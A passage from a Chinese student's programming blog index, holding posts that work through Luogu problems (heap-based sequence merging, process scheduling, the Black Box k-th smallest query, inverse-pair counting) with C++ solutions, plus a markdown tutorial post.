k); HeapifyFromUpToDown(minChild); } } } void Put(int le, int r) { length++; heap[length].left = le; heap[length].right = r; heap[length].value = a[le] + b[r]; HeapifyFromDownToUp(length); } Node Push() { Node temp; temp.left = heap[1].left; temp.right = heap[1].right; temp.value = heap[1].value; SwapHeap(1, length); length--; HeapifyFromUpToDown(1); return temp; } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;a[i]; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;b[i]; Put(1, 1); for(int i = 1; i &lt;= n; i++) { Node temp = Push(); cout&lt;&lt;temp.value&lt;&lt;&quot; &quot;; int r = temp.right; int le = temp.left; //这里有一个边界条件鸭 if(r - 1 == 0 || a[le + 1] + b[r - 1] &lt;= a[le] + b[r]) //这个小于等于就是默认规定辣 Put(le + 1, r); if(le - 1 == 0 || a[le - 1] + b[r + 1] &lt; a[le] + b[r]) Put(le, r + 1); } return 0; }我居然把函数名搞错了还居然花了我一个下午调试 解2还可以这样想呢~ 等我先把表格搬过来，嘿咻~ a\\b 1 3 4 5 7 9 1 2 4 5 6 8 10 2 3 5 6 7 9 11 4 5 7 8 9 11 13 6 7 9 10 11 13 15 8 9 11 12 13 15 17 9 10 12 14 15 17 19 把每一行当做优先队列，将第一列的值存入堆，输出最小值时把对应的行的下一列的值放入堆 也就是把表格横着扫一遍~ 当然这是其他dalao的思路，我搬过来而已QAQ 这样想更简单了 没有什么默认规则了，代码就舒服多了QAQ #include &lt;iostream&gt; using namespace std; int a[105000], b[105000], length = 0, n; struct Node { int value; int p1; int p2; }heap[500000]; void HeapifyUTD(int k) { if(k &lt;= length / 2) { int rChild = k * 2 + 1, lChild = k * 2, minChild; if(lChild == length) minChild = lChild; else minChild = heap[lChild].value &lt; heap[rChild].value ? lChild : rChild; if(heap[k].value &gt; heap[minChild].value) { swap(heap[k], heap[minChild]); HeapifyUTD(minChild); } } } Node Get() { Node tmp; tmp.p1 = heap[1].p1; tmp.p2 = heap[1].p2; tmp.value = heap[1].value; swap(heap[1], heap[length]); length--; HeapifyUTD(1); return tmp; } void HeapifyDTU(int k) { int parent = k / 2; if(parent &gt; 0) if(heap[k].value &lt; heap[parent].value) { swap(heap[k], heap[parent]); HeapifyDTU(parent); } } void Put(int p1, int p2) { length++; heap[length].p1 = p1; heap[length].p2 = p2; heap[length].value = a[p1] + b[p2]; HeapifyDTU(length); } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;a[i]; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;b[i]; for(int i = 1; i &lt;= n; i++) Put(i, 1); for(int i = 1; i &lt;= n; i++) { Node tmp = Get(); cout&lt;&lt;tmp.value&lt;&lt;&quot; &quot;; Put(tmp.p1, tmp.p2 + 1); } return 0; } 归纳： 遇见可以用 表格/暴力 做 超空间/超时间 的题,不妨先按着 表格/暴力做法 推几个数据找性质,然后根据性质选择性地从 表格/暴力做法 中筛选 需要的元素和需要的步骤 最后提一嘴 P2085 中的数组是[x][n]呢","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"Question-P2278","date":"2019-11-30T14:06:45.000Z","path":"2019/11/30/coding/questions/Question-P2278/","text":"P2278题目描述写一个程序来模拟操作系统的进程调度。假设该系统只有一个CPU，每一个进程的到达时间，执行时间和运行优先级都是已知的。其中运行优先级用自然数表示，数字越大，则优先级越高。 如果一个进程到达的时候CPU是空闲的，则它会一直占用CPU直到该进程结束。除非在这个过程中，有一个比它优先级高的进程要运行。在这种情况下，这个新的（优先级更高的）进程会占用CPU，而老的只有等待。 如果一个进程到达时，CPU正在处理一个比它优先级高或优先级相同的进程，则这个（新到达的）进程必须等待。 一旦CPU空闲，如果此时有进程在等待，则选择优先级最高的先运行。如果有多个优先级最高的进程，则选择到达时间最早的。 输入格式输入包含若干行，每一行有四个自然数（均不超过10^8），分别是进程号，到达时间，执行时间和优先级。不同进程有不同的编号，不会有两个相同优先级的进程同时到达。输入数据已经按到达时间从小到大排序。输入数据保证在任何时候，等待队列中的进程不超过15000个。 输出格式按照进程结束的时间输出每个进程的进程号和结束时间。 输入输出样例输入 #11 1 5 3 2 10 5 1 3 12 7 2 4 20 2 3 5 21 9 4 6 22 2 4 7 23 5 2 8 24 2 4 输出 #11 6 3 19 5 30 6 32 8 34 4 35 7 40 2 42 听音乐~ 白2的歌就是好听鸭~ 先扯一点废话没想到这么快就又摆上优先队列了哈哈哈哈哈真是巧合呢 (我居然又一次一次过了提高+/省选-的题) ↑你飘了↑ 解其实一开始我是没想优先队列的 你想嘛，优先级最大的， 最！~ 好的用堆 (不愧是我) (我真的受堆毒害不浅啊！) 好的好的，第一个想到的问题是怎么处理堆 即： 堆排序的规则 什么时候该添加节点 什么时候该拉取节点 如何处理时间 堆排序的规则题目说了，应该选取优先度最高的，同优先度相比时间最早的 所以总体来说就是一个最大堆廖 什么时候该添加节点呢？嗯..好问题 (自吹自擂？？！) 应该在有新的进程到达的时候添加 那么该怎么判断是否进程到达呢？ 设置一个循环，每循环一次到达一个进程 什么时候该拉取节点应该在这个进程处理完毕的时候拉取吧 进程在给的时间范围内已经被处理掉，就拉取一次进程 如果按照第一个问题走，这个过程应该是递归/递推的 如何处理时间嗯..这是一个意义深远的问题，至今我们也不知道会不会有穿越时间的能力存在 (↑胡扯↑你就给我皮↑) 这里的答案就是不要把时间看成连续抽象的，把时间分段，当需要处理事件时就拉取一次时间 问出这些问题，想必你已经对过程有了个大体的认识扒 过程↓2： 依次输入每个进程的参数(四个，优先度，编号，开始时间，持续时间)↓1： 如果堆非空 计算上次输入到这次输入的时间差 如果时间差 &gt; 正在执行的进程的持续时间(即这个进程是否执行完毕) (剩余的)时间差 = 时间差 - 正在执行的进程的持续时间 拉取优先度最大的节点，维护堆的性质 继续执行1: 如果堆非空(即是否还在执行进程) 正在执行的进程的持续时间 - (剩余的)时间差 将此输入入堆，维护堆的性质 存下这次输入进程的参数，传递给下次循环 继续进行2: 算法这里使用了结构体 #include &lt;iostream&gt; #define MAXSIZE 15500 using namespace std; int length = 0; struct A { int prior; int num; int stTime; int lastTime; }maxHeap[MAXSIZE]; void SwapHeap(int p1, int p2) { swap(maxHeap[p1].lastTime, maxHeap[p2].lastTime); swap(maxHeap[p1].num, maxHeap[p2].num); swap(maxHeap[p1].prior, maxHeap[p2].prior); swap(maxHeap[p1].stTime, maxHeap[p2].stTime); } void HeapifyFromUpToDown(int position) { if(position &lt;= length / 2) { int lChild = position * 2; int rChild = position * 2 + 1; int maxChild; if(rChild &gt; length) maxChild = lChild; else if(maxHeap[lChild].prior == maxHeap[rChild].prior) { if(maxHeap[lChild].stTime &lt;= maxHeap[rChild].stTime) maxChild = lChild; else maxChild = rChild; } else maxChild = maxHeap[lChild].prior &gt; maxHeap[rChild].prior ? lChild : rChild; if(maxHeap[maxChild].prior == maxHeap[position].prior) { if(maxHeap[maxChild].stTime &lt;= maxHeap[position].stTime) { SwapHeap(maxChild, position); HeapifyFromUpToDown(maxChild); } } else if(maxHeap[maxChild].prior &gt; maxHeap[position].prior) { SwapHeap(maxChild, position); HeapifyFromUpToDown(maxChild); } } } void HeapifyFromDownToUp(int position) { int parent = position / 2; if(parent &gt; 0) { if(maxHeap[parent].prior == maxHeap[position].prior) { if(maxHeap[parent].stTime &gt;= maxHeap[position].stTime) { SwapHeap(parent, position); HeapifyFromDownToUp(parent); } } else if(maxHeap[parent].prior &lt; maxHeap[position].prior) { SwapHeap(parent, position); HeapifyFromDownToUp(parent); } } } void PushMaxHeap() { SwapHeap(1, length); length--; HeapifyFromUpToDown(1); } void PutMaxHeap(int prior, int num, int stTime, int lastTime) { length++; maxHeap[length].prior = prior; maxHeap[length].num = num; maxHeap[length].stTime = stTime; maxHeap[length].lastTime = lastTime; HeapifyFromDownToUp(length); } int main() { int prior, num, stTime, durTime, timePass; int lastPrior, lastNum, lastStTime, lastDurTime; while(cin&gt;&gt;num&gt;&gt;stTime&gt;&gt;durTime&gt;&gt;prior) { if(length != 0) { timePass = stTime - lastStTime; while( length != 0 &amp;&amp; timePass &gt;= maxHeap[1].lastTime ) { cout&lt;&lt;maxHeap[1].num&lt;&lt;&quot; &quot;; timePass = timePass - maxHeap[1].lastTime; cout&lt;&lt;stTime - timePass&lt;&lt;endl; PushMaxHeap(); } if(length != 0) maxHeap[1].lastTime = maxHeap[1].lastTime - timePass; } PutMaxHeap(prior, num, stTime, durTime); lastNum = num; lastPrior = prior; lastStTime = stTime; lastDurTime = durTime; } int time = lastStTime; if(length != 0) { while(length != 0) { cout&lt;&lt;maxHeap[1].num&lt;&lt;&quot; &quot;; cout&lt;&lt;time + maxHeap[1].lastTime&lt;&lt;endl; time = time + maxHeap[1].lastTime; PushMaxHeap(); } } return 0; } 复杂度分析全是条件句分析好难啊 我还是根据结果论分析吧 时间就约等于1s吧，数据量应该是满的，15000 查一下表得知，是O(nlgn) 下表记住廖： 复杂度 下限 上限 O(logN) 10^20 很大 O(N^1/2) 10^12 10^14 O(N) 10^6 10^7 O(NlogN) 10^5 10^6 O(N^2) 1000 2500 O(N^3) 100 500 O(N^4) 50 50 O(2^N) 20 20 O(N!) 9 10","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"模拟","slug":"模拟","permalink":"https://v25bh145.github.io/tags/%E6%A8%A1%E6%8B%9F/"}]},{"title":"Question-P1801","date":"2019-11-30T10:25:11.000Z","path":"2019/11/30/coding/questions/Question-P1801/","text":"P1801题目描述Black Box是一种原始的数据库。它可以储存一个整数数组，还有一个特别的变量i。最开始的时候Black Box是空的．而i等于0。这个Black Box要处理一串命令。 命令只有两种： ADD(x):把x元素放进BlackBox; GET:i加1，然后输出Blackhox中第i小的数。 记住：第i小的数，就是Black Box里的数的按从小到大的顺序排序后的第i个元素。例如： 我们来演示一下一个有11个命令的命令串。（如下图所示） 现在要求找出对于给定的命令串的最好的处理方法。ADD和GET命令分别最多200000个。现在用两个整数数组来表示命令串： 1.A(1)，A(2)，…A(M)：一串将要被放进Black Box的元素。每个数都是绝对值不超过2000000000的整数，M$200000。例如上面的例子就是A=(3，1，一4，2，8，-1000，2)。 2.u(1)，u(2)，…u(N)：表示第u(j)个元素被放进了Black Box里后就出现一个GET命令。例如上面的例子中u=(l，2，6，6)。输入数据不用判错。 输入格式第一行，两个整数，M，N。 第二行，M个整数，表示A(l) ……A(M)。 第三行，N个整数，表示u(l) …u(N)。 输出格式输出Black Box根据命令串所得出的输出串，一个数字一行。 输入输出样例输入 #1 7 4 3 1 -4 2 8 -1000 2 1 2 6 6输出 #1 3 3 1 2说明/提示对于30%的数据，M≤10000; 对于50%的数据，M≤100000： 对于100%的数据，M≤200000。 听音乐 解康康这道题辣，给出了m的数据范围在200000之内分析下时间复杂度应该是要求 O(mlgm) 题目的意思大概就是 需要给出在加入第i个元素的排序序列时需要序列第j个小的值 j是自增的 而i是任意给定的自增数列 (题目没说我差点就想再来个排序了) 然后题把加入和查询单独两列列开了，用最简单的模拟显然是不阔以加入一个检测一个的 所以先把add和get操作存进数组里，后续再一并处理： for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmp; putOp[i] = tmp; } for(int i = 1; i &lt;= n; i++) { cin&gt;&gt;tmp; getOp[i] = tmp; }之后的处理也大概能写个框架出来 headGet = 1; for(int i = 1;i &lt;= m; i++) { //Mark.1 //对putOp[i]进行处理 while(getOp[headGet] == i) { //Mark.2 //对getOp[headGet]进行处理 cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } }这里需要注意一下while,题目实例就给出了get重复的i值 我才不是因为一开始写的if等到写完了算法回去再测试的时候菜发现的呢 (菜) 好了，那我们来填补一下里面的操作扒 Mark.1:这里如果想要实现的话，最暴力的操作就是插入排序，把putOp[i]插入到数组中 同时使得数组的升序不变性保持不变 时间复杂度：theta($m^{2}$) 明显超了 嗯就先这么来吧，暴力解get Mark.2:如果按照上文的插入排序，这里就十分简单辣 直接返回a[i]就可以辣 来康暴力代码：仅仅展示了一些暴力插入排序 为了博客效果写了份暴力代码还不快夸我 void InsertArray(int k) { length++; array[length] = k; if(length != 1) { for(int i = length - 1; i &gt;= 1; i--) { if(array[i + 1] &lt; array[i]) swap(array[i + 1], array[i]); else break; } } } int main() { for(int i = 1;i &lt;= m; i++) { InsertArray(putOp[i]); while(getOp[headGet] == i) { tmp = array[headGet]; cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } } return 0; }果然暴力插♂入只有30分嘛 好的继续，现在我们需要优化程序廖 插入排序的优化Mark.1这里的插入消耗时间显然过长，一定需要在这里优化 来一波分析，如果需要theta(mlgm) 外部的循环已经配了一层m了，所以里面的要求只能是最多lgm 然后需要的是第i大的数…第i大…第 很容易想到堆的性质鸭！！ 所以我们先建一个最小堆 这样在这里的操作复杂度就是O(lgm)廖 接下来甩锅给Mark.2同学 Mark.2这里需要获取第headGet小的值 能做的就是类似堆排序一样的东东，不断从堆顶拔头发取数字，然后交换最后一个让最后一个顺下去，取headGet遍 恭喜我得出来这个玩意儿：O($m^{2}$lgm) 怎么来的？考虑最坏情况为在put(m)处连续get(m)次，也就是堆排序辣 这个算法使得Mark.2更暴力辣，Mark.2号同学肯定不服气了，把锅儿一巴掌呼回了Nark.1 堆的优化需要优化Mark.2，这时我们把眼光看向瑟瑟发抖的Mark.1 我们可以在Mark.1上加入一些时间来简化Mark.2的时间 怎么做呢？ 好戏来了这里考虑到Mark.2在获取第headGet大的数据时多执行了headGet - 1次 有什么办法直接获取到第headGet大的数字呢？ 我们可以让第headGet大的数字直接位于堆首，把比headGet小的数字扔进弃牌区里 在Mark.2读取完第headGet大的数据后，headGet++，然后把第headGet大的数据也扔进弃牌区里 这时回到Mark.1，我们在加入数据的时候需要在先跟弃牌区里的数字比较一下，然后挑出最大的放到最小堆里 诶，这里这个弃牌区怎么实现呢？ 首先考虑到弃牌区必须要有序 元素依次加入的同时维护有序性 所以我们自然想到了我们的老朋友–插入排序！ 别急，还没完！ 然后再次考虑到我们需要获取最大的元素 再想想刚刚的暴力插入排序转变的过程 终于发现了嘛？ 其实可以将弃牌区用最大堆实现！ 所以总体，复述一下操作： 执行putOp时 将其放入最大堆，维护最大堆性质 从最大堆挑出最大的元素，维护最大堆性质 将挑出的元素放入最小堆，维护最小堆性质 执行getOp时 从最小堆挑出最小的元素，维护最小堆性质 输出它 将挑出的元素放入最大堆，维护最大堆性质 最终的双堆数据结构代码：从输入到处理到输出都写上了 堆的维护好好康康鸭，两种维护方式(自顶向下，自叶向上)都要用上 #include &lt;iostream&gt; #define MAXSIZE 200500 using namespace std; int n,m; int maxLength = 0, minLength = 0; int minHeap[MAXSIZE], maxHeap[MAXSIZE],getOp[MAXSIZE],putOp[MAXSIZE]; void MinHeapifyUpToDown(int k) //up to down { if(k &lt;= minLength / 2) { int lChild = k * 2; int rChild = k * 2 + 1; int minChild; if(rChild &gt; minLength) minChild = lChild; else minChild = minHeap[lChild] &lt; minHeap[rChild] ? lChild : rChild; if(minHeap[k] &gt; minHeap[minChild]) { swap(minHeap[k], minHeap[minChild]); MinHeapifyUpToDown(minChild); } } } void MinHeapifyDownToUp(int k) //down to up { if(k / 2 &gt; 0) { int parent = k / 2; if(minHeap[parent] &gt; minHeap[k]) { swap(minHeap[parent], minHeap[k]); MinHeapifyDownToUp(parent); } } } void PutMinHeap(int k) { minLength++; minHeap[minLength] = k; MinHeapifyDownToUp(minLength); } int GetMinHeap() { int result = minHeap[1]; swap(minHeap[1], minHeap[minLength]); minLength--; MinHeapifyUpToDown(1); return result; } void MaxHeapifyDownToUp(int position) { int parent = position / 2; if(parent &gt; 0) { if(maxHeap[parent] &lt; maxHeap[position]) { swap(maxHeap[parent], maxHeap[position]); MaxHeapifyDownToUp(parent); } } } void MaxHeapifyUpToDown(int position) { if(position &lt;= maxLength / 2) { int maxChild; int lChild = position * 2; int rChild = position * 2 + 1; if(rChild &gt; maxLength) maxChild = lChild; else maxChild = maxHeap[lChild] &gt; maxHeap[rChild] ? lChild : rChild; if(maxHeap[position] &lt; maxHeap[maxChild]) { swap(maxHeap[position], maxHeap[maxChild]); MaxHeapifyUpToDown(maxChild); } } } void PutMaxHeap(int k) { maxLength++; maxHeap[maxLength] = k; MaxHeapifyDownToUp(maxLength); } int GetMaxHeap() { int result = maxHeap[1]; swap(maxHeap[1], maxHeap[maxLength]); maxLength--; MaxHeapifyUpToDown(1); return result; } int main() { cin&gt;&gt;m&gt;&gt;n; int tmp,headGet; for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmp; putOp[i] = tmp; } for(int i = 1; i &lt;= n; i++) { cin&gt;&gt;tmp; getOp[i] = tmp; } headGet = 1; for(int i = 1;i &lt;= m; i++) { PutMaxHeap(putOp[i]); tmp = GetMaxHeap(); PutMinHeap(tmp); while(getOp[headGet] == i) { tmp = GetMinHeap(); PutMaxHeap(tmp); cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } } return 0; } 感想：这道题我居然一次做出来了诶，果然堆对我的毒害不浅哈哈哈哈 所以大概什么时候使用堆呢？ 插入排序的优化 “最”出现的时候 优先队列(早日遇上过来水水写写)","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"Question-P1908","date":"2019-11-26T10:36:39.000Z","path":"2019/11/26/coding/questions/Question-P1908/","text":"P1908题目描述猫猫TOM和小老鼠JERRY最近又较量上了，但是毕竟都是成年人，他们已经不喜欢再玩那种你追我赶的游戏，现在他们喜欢玩统计。最近，TOM老猫查阅到一个人类称之为“逆序对”的东西，这东西是这样定义的：对于给定的一段正整数序列，逆序对就是序列中ai&gt;aj且i&lt;j的有序对。知道这概念后，他们就比赛谁先算出给定的一段正整数序列中逆序对的数目。 Update:数据已加强。 输入格式第一行，一个数n，表示序列中有n个数。 第二行n个数，表示给定的序列。序列中每个数字不超过10^9109 输出格式给定序列中逆序对的数目。 输入输出样例输入 #1 6 5 4 2 6 3 1输出 11说明/提示对于25%的数据，n \\leq 2500n≤2500 对于50%的数据，n \\leq 4 \\times 10^4n≤4×104 。 对于所有数据，n \\leq 5 \\times 10^5n≤5×105 请使用较快的输入输出 题外话听音乐~ 啊对了，忘了说廖，建立这个博客就是为了记录学编程的过程呢 大概是初二(初三？？ 反正我也不知道我跳的是初二还是初三hhh)开始学的C扒 然后高一试着搞了搞noip，高二喜提省二第一就放弃廖TAT 菜是原罪啊 现在大一廖，也不知道怎么脑子抽了报志愿就报了计算机专业hhh 终于决定痛改前非，去搞一搞ACM 总之就是你们面前这个写博客的蒟蒻又双叒叕开始学编程了QAQ 应该在博客里打算记一下这些东西： 算法题中过程出大问题的地方 Question 应该会按照算法分好类 一些奇♂妙的编程方法 Algorithm 一些编程科目的小笔记 Note 应该不多这个 嘛应该会记得很杂很杂…..尽量分个小类吧hhh 不啰嗦了hh 解嘛首先看到这道题，分析一波数据要求theta(nlgn) 然后首先考虑遍历数组，发现暴力做法就是遍历两遍数组： 暴力解法for(int i = 1; i &lt;= n; i++) for(int j = i + 1; j &lt;= n; j++&gt;) if(a[i] &gt; a[j]) count++;嗯就是这么暴力,自己求一遍逆，用计算机打出我的暴力思路hhh 然后发现题目标签有分治法，这道题可以用分治法来做 先拆分，一般都拆成二分一列数组的逆序数 = 中间靠左数组的逆序数 + 中间靠右数组的逆序数 + 两个子数组之间产生的逆序数 然后递归求解两边的逆序数，发现：原子问题： 两个数字的逆序数 最后要合并问题 这里我为难廖，怎么合并呢？也就是说，怎么求两个子数组之间产生的逆序数呢？ 先考虑暴力做法，跟上方的代码差不多，左边遍历一遍，然后嵌套里面，里面右边遍历一遍 有什么优化嘛？什么被重复计算了？ 我发现了：假设5&gt;2，5在2前面，如果有7&gt;5，7在2的前面，那么一定有7&gt;2 这里自然而然想到了排序，也就假设左右合并的数组已经排好序(升序)了 发现只用遍历一遍就能出结果 计数好右边的数字的数目 遍历整个排好升序的数组 如果遍历到右边的数字，计数– 如果遍历到左边的数字，结果 += 计数 如此得合并的时间复杂度为 排序的复杂度+一个单n 分治法1这里搞了一个结构体，用来暂存传入Merge()中的数组以及下标，并且排好序 //分治法的合并 int Merge(int l, int r) { for(int i = l; i &lt;= r; i++) { snot2[i].num = snot[i]; snot2[i].p = i; } VQuickSort(l, r); int count = 0, result = 0; for(int i = l; i &lt;= r; i++) { if(snot2[i].p &gt; ( l + r ) / 2) count++; if(snot2[i].p &lt;= ( l + r ) / 2) result += count; snot2[i].num = 0; snot2[i].p = 0; } return result; } //分治法的拆分和递归 int Rev(int l, int r) { if(l + 1 == r) { if(snot[l] &gt;= snot[r]) return 1; else return 0; } else if (l &lt; r) { int mid = ( l + r ) / 2; int leftValue = Rev(l, mid); int rightValue = Rev(mid + 1, r); int midValue = Merge(l, r); return leftValue + rightValue + midValue; } else return 0; }正确性：由循环不变式确定，正确 时间复杂度( T(1) = theta(1) )： T(n) = 2T(n / 2) + nlgn = theta(nlg(n)lg(n)) 嗯还是超了，事实证明只过了前50% 很明显问题出在Merge()上，每次都排一次序很麻烦 然后 这 个 时 候 我终于意识到了 这玩意跟归并排序好像啊！ 归并排序也有排序啊，也有分治啊 归并排序的Merge()部分，数组是由Partition部分排过序的 那么这个题也在Partition部分排个序也就行廖 分治法2其实这个题就是分治法加上一个返回值啊…… long long int Merge(int left, int right) { int mid = (left + right) / 2; int leftLength = right - mid; long long int result = 0; int k,p; k = mid; p = right; for(int i = 1; i &lt;= right - left + 1; i++) { if(k &lt; left) { mia[i] = snot[p]; p--; leftLength--; } else if(p &lt; mid + 1) { mia[i] = snot[k]; k--; } else if(snot[k] &lt;= snot[p]) { mia[i] = snot[p]; p--; leftLength--; } else if(snot[k] &gt; snot[p]) { mia[i] = snot[k]; k--; result += leftLength; } } for(int i = right - left + 1; i &gt;= 1; i--) { snot[left + right - left + 1 - i] = mia[i]; mia[i] = 0; } return result; } long long int Rev(int left, int right) { if(left &lt; right) { if(left + 1 == right) { if(snot[left] &gt; snot[right]) { swap(snot[left], snot[right]); return 1; } else return 0; } int mid = (left + right) / 2; long long int leftValue = Rev(left, mid); long long int rightValue = Rev(mid + 1, right); long long int midValue = Merge(left, right); return leftValue + rightValue + midValue; } return 0; }嗯，AC了，是我愚钝，把这道普及+的题看♂了QAQ 以后分治的时候可别再犯这种 过程重复计算使时间空间复杂度提高 的蠢错误了啊QAQ 欧系卖To be continued","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"分治法","slug":"分治法","permalink":"https://v25bh145.github.io/tags/%E5%88%86%E6%B2%BB%E6%B3%95/"}]},{"title":"我的第一个博客","date":"2019-11-26T09:28:19.000Z","path":"2019/11/26/我的第一个博客/","text":"首先，不管你是谁，总之欢迎来到我的博客鸭~ 听音乐~ 第一个博客文章，我就记一下.md的相关知识扒 学自菜鸟教程 https://www.runoob.com/markdown/md-tutorial.html 一. 标题标题一共六种鸭，一级到六级 一级标题二级标题三级标题四级标题五级标题六级标题# 一级标题 ## 二级标题 ### 三级标题 #### 四级标题 ##### 五级标题 ###### 六级标题 一级标题 ------- 二级标题 =======二. 段落的格式关于换行的话，有两种方式： 在一行尾部空出两个以上空格 多空一行 这两种方式有差别的亚子 段落的字体可以自己设置鸭 有这些： 星号星号可以插入在文本之间呢 斜体字~粗♂体字粗♂斜♂体 *斜体字~* **粗♂体字** ***粗♂斜♂体*** 下划线下划线只能在段首段位使用的斜体字~粗♂体字 _斜体字~_ __粗♂体字__ 分割线↓这个就是个分割线辣~~↓ *** * * * ***** - - - ------- 删除线删除线一一一(调皮) ~~删除线~~ 下划线这个 &lt;u&gt;下划线&lt;/u&gt; 脚注 脚注貌似无法使用emmmmm 三. 列表有序的和无序的： 第一项 第二项 第三项 * 第一项 * 第二项 * 第三项 + 第一项 + 第二项 + 第三项 - 第一项 - 第二项 - 第三项 qaq qaq qaq 1. qaq 2. qaq 3. qaq 然后还能嵌套,像酱紫 qaq qaq qaq qaq qaq qaq qaq qaq qaq qaq (混乱) 四. 区块区块引用就是加上一个&gt;符号和一个空格 我是一个区块引用 巧了，我也是诶 我不仅有一级引用 我还有二级引用 甚至还有三级 甚至还能做列表 还能嵌套 列表 区块引用 &gt; 我是一个区块引用 &gt; 巧了，我也是诶 &gt; 我不仅有一级引用 &gt; &gt; 我还有二级引用 &gt; &gt; &gt; 甚至还有三级 &gt; &gt; &gt; * 甚至还能做列表 &gt; &gt; &gt; + 还能嵌套 &gt; &gt; 1. 列表 &gt; &gt; &gt; &gt; 区块引用五. 代码scanf()函数~printf()函数~static void main(String[] args) `scanf()`函数~ `printf()`函数~ `static void main(String[] args` 空四格或者一个Tab就是代码区块辣 ----&gt;像这样(这怎么描述啊喂)六. 链接比如酱紫: 滚去问度娘啊！ 滚去问[度娘](http://www.baidu.com/)啊！https://v25bh145.github.io/ &lt;https://v25bh145.github.io/&gt;还有高级(搞♂基)的链接 变量式的： 滚去问度娘啊啊啊 baidu滚去问[我的主页]啊啊啊 主页 七. 图片![alt 属性文本](图片地址) ![alt 属性文本](图片地址 &quot;可选标题&quot;) alt 属性文本 :就是图片的替代文字 可选标题 :title属性的文字 我这里用了这个上传图片网站哇 ![example.png](https://i.loli.net/2019/11/26/eSxz8W2A6rFpMyK.png)当然是可以使用变量的啦 [example][1] [1]: &quot;链接&quot;八. 表格 表头 &lt;-学姐头没了(滑稽) 单元格儿 单元格儿 单元格儿 单元格儿 单元格儿 单元格儿 |表头||&lt;-学姐头没了(滑稽)| | ---- | ---- | ---- | | 单元格儿 | 单元格儿 | 单元格儿 | | 单元格儿 | 单元格儿 | 单元格儿 |表头底下的横线还可以设置表格格式： :—- 居左对齐 —-: 居右对齐 :—-: 居中对齐 ⑨. 另外一些gao♂ji特性一些高级技巧： 支持HTML元素也就是说可以不用学markdown直接开学html哈哈哈 *转义* \\*转义\\* 内嵌数学公式以$$开始，$$结束,格式为TeX或者LaTeX","tags":[{"name":"markdown","slug":"markdown","permalink":"https://v25bh145.github.io/tags/markdown/"},{"name":"随笔","slug":"随笔","permalink":"https://v25bh145.github.io/tags/%E9%9A%8F%E7%AC%94/"}]}]